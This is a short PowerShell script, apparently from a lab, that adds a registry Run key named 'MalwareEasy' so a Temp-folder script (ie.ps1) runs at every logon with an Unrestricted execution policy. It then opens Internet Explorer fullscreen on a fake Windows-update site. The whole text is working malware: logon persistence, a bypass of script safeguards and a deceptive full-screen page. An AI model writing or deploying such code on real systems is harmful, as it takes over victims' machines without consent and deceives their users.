$RunKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
set-itemproperty $RunKey "MalwareEasy" ('C:\Windows\System32\WindowsPowerShell\v1.0\Powershell.exe -executionPolicy Unrestricted -File ' + "C:\Users\esdlab\AppData\Local\Temp\ie.ps1")

$IE = new-object -com internetexplorer.application
$IE.navigate2("http://fakeupdate.net/win10u/")
$IE.visible = $true
$IE.Fullscreen = $true

